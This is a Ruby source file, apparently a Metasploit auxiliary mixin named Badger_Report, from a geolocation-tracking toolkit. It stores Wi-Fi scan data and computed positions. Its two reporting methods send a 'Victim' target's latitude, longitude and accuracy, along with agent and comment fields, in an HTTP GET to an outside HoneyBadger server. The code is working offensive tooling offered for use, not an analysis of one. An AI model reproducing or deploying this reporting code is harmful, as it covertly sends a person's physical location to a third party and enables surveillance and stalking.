module Msf

	module Auxiliary::Badger_Report

        require 'net/https'
        require 'net/http'

    def initialize(info = {})
		super
		
		register_options(
			[
			OptString.new('BADGER_TGT',   [ true, "Badger Target", "Victim" ]),
			OptString.new('BADGER_URI',   [ true, "Bager Reporting Page", "http://honeybadger.lanmaster53.com/service.php?"]),
			], self.class
			)
	end

	class Wlan_net
		def initialize(ssid,mac,rssi)
			@ssid=ssid
			@mac=mac
			@rssi=rssi
		end
		def ssid
			@ssid
		end
		def mac
			@mac
		end
		def rssi
			@rssi
		end
	end

	class Position
		def initialize(lat,lon,acc)
			@lat=lat
			@lon=lon
			@acc=acc
		end
		def lat
			@lat
		end
		def lon
			@lon
		end
		def acc
			@acc
		end
	end

	def report_cresults(pos,agent,comment)
		reporting_uri = "#{datastore['BADGER_URI']}target=#{datastore['BADGER_TGT']}&agent=#{agent}&comment=#{comment}"
		if (pos.acc)
			reporting_uri << "&lat=#{pos.lat}&lng=#{pos.lon}&acc=#{pos.acc}"
		end
		print_status("Badger report sent to: #{datastore['BADGER_URI']}")
		uri = URI.parse(reporting_uri)
		response = Net::HTTP.get_response(uri)
	end

	def report_results(pos,agent)
		reporting_uri = "#{datastore['BADGER_URI']}target=#{datastore['BADGER_TGT']}&agent=#{agent}"
		if (pos.acc)
			reporting_uri << "&lat=#{pos.lat}&lng=#{pos.lon}&acc=#{pos.acc}"
		end
		print_status("Badger report sent to: #{datastore['BADGER_URI']}")
		uri = URI.parse(reporting_uri)
		response = Net::HTTP.get_response(uri)
        

		end
	end
end
